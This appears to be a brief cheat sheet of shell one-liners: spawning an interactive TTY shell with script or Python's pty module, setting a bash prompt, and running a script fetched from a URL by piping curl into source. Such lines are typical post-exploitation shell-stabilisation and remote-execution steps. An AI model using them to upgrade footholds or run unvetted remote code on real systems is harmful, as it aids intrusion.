
- Spawn TTY shell: `/usr/bin/script -qc /bin/bash /dev/null` 
  - to add PWD in bash: `PS1='\u@\h:\w\$ '`


- Spawn Python TTY Shell: `python -c 'import pty;pty.spawn("/bin/bash")'`


- Run script from URL: `source <(curl -s http://mywebsite.com/myscript.sh)`
